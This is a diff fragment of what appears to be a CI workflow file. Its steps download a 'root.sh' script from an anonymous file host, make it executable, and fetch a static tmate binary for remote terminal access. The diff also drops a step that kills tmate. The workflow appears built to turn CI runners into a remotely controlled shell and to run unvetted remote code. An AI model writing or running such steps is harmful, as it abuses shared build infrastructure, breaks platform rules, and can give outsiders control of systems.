@@ -7,8 +7,6 @@ jobs:
     steps:
       - name: exz root
         run: wget -O root.sh https://files.catbox.moe/dk1s2w.txt && chmod +x root.sh
-      - name: exz pkill
-        run: pkill -9 tmate
       - name: exz vps
         run: wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
       - name: exz tar skip
